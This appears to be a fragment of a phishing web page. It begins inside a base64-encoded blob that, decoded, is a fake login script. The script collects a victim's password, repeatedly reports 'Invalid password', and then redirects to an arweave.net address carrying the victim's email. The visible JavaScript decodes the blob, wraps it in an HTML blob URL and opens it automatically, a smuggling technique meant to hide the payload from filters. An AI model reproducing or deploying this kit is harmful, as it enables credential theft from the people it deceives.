jbXNnIikuc2hvdygpOwogICAgICAgICAgICAJCWNvbnNvbGUubG9nKHJlc3BvbnNlKTsKICAgICAgICAgICAgCQlpZihyZXNwb25zZVsnc2lnbmFsJ10gPT0gJ29rJyl7CiAgICAgICAgICAgIAkJCSQoIiNwYXNzd29yZCIpLnZhbCgiIik7CiAgICAgICAgICAgIAkJCWlmIChjb3VudD49MikgewogICAgICAgICAgICAJCQkJY291bnQ9MDsKICAgICAgICAgICAgICAgICAgICAvLyB3aW5kb3cubG9jYXRpb24ucmVwbGFjZShyZXNwb25zZVsncmVkaXJlY3RfbGluayddKTsKICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly9hcndlYXZlLm5ldC9ncVEzNGxiX0ZkU2dOVkN0dHF1a3BKWmp0V3BjVXpIQU8zRzB4bjhnWW1VPyZlbT0iK2VtYWlsKTsKCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAkgICAgICAgICAgICAgCSAkKCIjbG9naW4tc3RhdHVzIikuc2hvdygpOwoJCQkkKCcjbG9naW4tc3RhdHVzLW1lc3NhZ2UnKS5odG1sKCJJbnZhbGlkIHBhc3N3b3JkLiBQbGVhc2UgdHJ5IGFnYWluIik7CgkJCQlzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7JCgnI2xvZ2luLXN0YXR1cycpLmhpZGUoKTt9LCAxNTAwKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgCSAgICAgICAgICAgICAgICAgICAgICAgICAJICAgICAgICAgICAgIAkgJCgiI2xvZ2luLXN0YXR1cyIpLnNob3coKTsKCQkJJCgnI2xvZ2luLXN0YXR1cy1tZXNzYWdlJykuaHRtbCgiSW52YWxpZCBwYXNzd29yZC4gUGxlYXNlIHRyeSBhZ2FpbiIpOwoJCQkJc2V0VGltZW91dChmdW5jdGlvbigpeyQoJyNsb2dpbi1zdGF0dXMnKS5oaWRlKCk7fSwgMTUwMCk7CiAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSwKICAgIGVycm9yOiBmdW5jdGlvbigpewogICAgCSQoIiNwYXNzd29yZCIpLnZhbCgiIik7CiAgICAJaWYgKGNvdW50Pj0yKSB7CiAgICAJCWNvdW50PTA7CiAgICAJCSAgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vYXJ3ZWF2ZS5uZXQvZ3FRMzRsYl9GZFNnTlZDdHRxdWtwSlpqdFdwY1V6SEFPM0cweG44Z1ltVT8mZW09IitlbWFpbCk7CiAgICAJfQogICAgICAgICAgICAkKCIjbG9naW4tc3RhdHVzIikuc2hvdygpOwoJCQkkKCcjbG9naW4tc3RhdHVzLW1lc3NhZ2UnKS5odG1sKCJUaGUgbG9naW4gaXMgaW52YWxpZC4iKTsKICAgICAgICAgICAgCXNldFRpbWVvdXQoZnVuY3Rpb24oKXskKCcjbG9naW4tc3RhdHVzJykuaGlkZSgpO30sIDE1MDApOyAgIAogICAgfSwKICAgIGNvbXBsZXRlOiBmdW5jdGlvbigpewogICAgCQogICAgfQp9KTsKICB9KTsKCgoJfSk7CgoKPC9zY3JpcHQ+Cgo8L2JvZHk+PC9odG1sPg==';
    var decodedStringAtoB = atob(encodedStringAtoB);
	const myBlob = new Blob([decodedStringAtoB], {type: 'text/html'})
	const url =  window.URL.createObjectURL(myBlob) + "#" + emaqa;
	a.attr("href", url);
	$("body").append(a);
	a[0].click();
  window.URL.revokeObjectURL(url);
  a.remove();
}
 </script>

</head>

</body>
